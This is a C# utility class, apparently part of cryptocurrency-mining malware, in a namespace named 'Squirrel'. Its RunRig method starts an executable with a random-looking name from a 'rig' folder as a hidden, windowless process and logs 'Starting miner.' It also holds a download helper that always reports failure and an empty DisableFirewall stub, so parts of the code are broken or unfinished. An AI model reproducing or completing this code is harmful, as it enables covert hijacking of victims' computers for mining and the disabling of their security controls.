using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Squirrel
{
    public static class Utilities
    {
        public static async Task<bool> DownloadFile(string url, string target)
        {
            return await Task.Run(() =>
            {
                try
                {
                    using (var client = new WebClient())
                    {
                        client.DownloadFile(url, target);
                    }
                }
                catch (Exception)
                {

                }
                return false;
            });
        }

        public static async Task<bool> DisableFirewall()
        {
            return await Task.Run(() =>
            {
                try
                {

                }
                catch (Exception)
                {

                }
                return false;
            });
        }

        public static async Task RunRig()
        {
            await Task.Run(() =>
            {
                Console.WriteLine("Starting miner.");
                string apppath = Path.GetFullPath(AppDomain.CurrentDomain.BaseDirectory + "/rig/ZRHHKU8VZENP4PQYE3J4.exe");

                var proc = CreateHidden(apppath);
                proc.Start();
                proc.BeginErrorReadLine();
                proc.BeginOutputReadLine();
                proc.WaitForExit();

                Console.WriteLine("Miner quit.");

            });
        }
        public static Process CreateHidden(string targetexe)
        {
            string workingdir = Path.GetDirectoryName(targetexe);
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = targetexe,
                    WorkingDirectory = workingdir,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    ErrorDialog = true

                },
            };

            proc.ErrorDataReceived += (sendingProcess, errorLine) => Console.WriteLine(errorLine.Data);
            proc.OutputDataReceived += (sendingProcess, dataLine) => Console.WriteLine(dataLine.Data);

            return proc;
        }
    }
}
